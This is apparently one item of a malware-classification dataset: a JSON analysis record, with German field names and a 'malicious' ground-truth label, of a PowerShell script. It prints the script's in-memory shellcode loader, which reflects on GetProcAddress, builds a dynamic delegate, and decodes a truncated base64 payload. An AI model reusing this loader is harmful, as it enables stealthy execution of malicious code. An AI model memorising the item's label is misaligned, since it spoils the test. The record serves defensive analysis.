@@ -1,0 +1,107 @@
+{
+  "meta": {
+    "quelldatei": "09094ed7deb2b722d47c888b47bc8d71b33355e5052b6e42621e4e98642e7ea9.ps1",
+    "sha256": "09094ed7deb2b722d47c888b47bc8d71b33355e5052b6e42621e4e98642e7ea9",
+    "groesse_bytes": 372087,
+    "zeilen": 43,
+    "ground_truth_label": "malicious",
+    "analyse_gekuerzt": true,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      ")[-1].Equals(",
+      ") }).GetType(",
+      ")\n\t$var_gpa = $var_unsafe_native_methods.GetMethod(",
+      ", [Type[]] @(",
+      "string",
+      "GetModuleHandle",
+      "ReflectedDelegate",
+      "InMemoryModule",
+      "MyDelegateType",
+      "Class, Public, Sealed, AnsiClass, AutoClass",
+      "RTSpecialName, HideBySig, Public",
+      "Runtime, Managed",
+      "Invoke",
+      "Public, HideBySig, NewSlot, Virtual"
+    ],
+    "string_anzahl_gesamt": 15,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 1
+  },
+  "stufe2_features": {
+    "strings": [
+      ")[-1].Equals(",
+      ") }).GetType(",
+      ")\n\t$var_gpa = $var_unsafe_native_methods.GetMethod(",
+      ", [Type[]] @(",
+      "string",
+      "GetModuleHandle",
+      "ReflectedDelegate",
+      "InMemoryModule",
+      "MyDelegateType",
+      "Class, Public, Sealed, AnsiClass, AutoClass",
+      "RTSpecialName, HideBySig, Public",
+      "Runtime, Managed",
+      "Invoke",
+      "Public, HideBySig, NewSlot, Virtual"
+    ],
+    "string_anzahl_gesamt": 15,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 1,
+    "beobachtete_cmdlets": [
+      "New-Object",
+      "Set-StrictMode",
+      "Where-Object"
+    ],
+    "auffaellige_tokens": {
+      "frombase64": 1,
+      "reflection_assembly": 3
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      ")[-1].Equals(",
+      ") }).GetType(",
+      ")\n\t$var_gpa = $var_unsafe_native_methods.GetMethod(",
+      ", [Type[]] @(",
+      "string",
+      "GetModuleHandle",
+      "ReflectedDelegate",
+      "InMemoryModule",
+      "MyDelegateType",
+      "Class, Public, Sealed, AnsiClass, AutoClass",
+      "RTSpecialName, HideBySig, Public",
+      "Runtime, Managed",
+      "Invoke",
+      "Public, HideBySig, NewSlot, Virtual"
+    ],
+    "string_anzahl_gesamt": 15,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 1,
+    "beobachtete_cmdlets": [
+      "New-Object",
+      "Set-StrictMode",
+      "Where-Object"
+    ],
+    "auffaellige_tokens": {
+      "frombase64": 1,
+      "reflection_assembly": 3
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    },
+    "deobfuskiert_auszug": "Set-StrictMode -Version 2\n\nfunction func_get_proc_address {\n\tParam ($var_module, $var_procedure)\t\t\n\t$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n\t$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))\n\treturn $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))\n}\n\nfunction func_get_delegate_type {\n\tParam (\n\t\t[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,\n\t\t[Parameter(Position = 1)] [Type] $var_return_type = [Void]\n\t)\n\n\t$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n\t$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\t$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\n\treturn $var_type_builder.CreateType()\n}\n\nIf ([IntPtr]::size -eq 8) {\n\t[Byte[]]$var_code = [System.Convert]::FromBase64String('RSw8pyMjIyMjLDwjRSw8ZyMjRSw8ZyMjRSw8ZyMjsyw8oyMjIyNFsyw8I2J7YnN2a6rGa6LPAyMjI2uuPsnc3NxrqvxrouAfTSIj3PBim9OWgXVLJyMjI3lrqtrc8yMjIyMjIyMjI88jIyNTPhgmblN5VmNC/27Hx8oiZaClFWA/9X8LRRdduwPyzgPcSrvqsJPSzyLYDRDYvOMaKBgnr0QgVEcy4H6KJQrImwqzHQm1+NG8I1CtRnr5EnTu1ool0VBeCL0tlRu5CJBli1VceLNsH7B9F4CtdG+GbaY8k7C2",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": [
+      "Base64-Inhalt dekodieren"
+    ]
+  }
+}
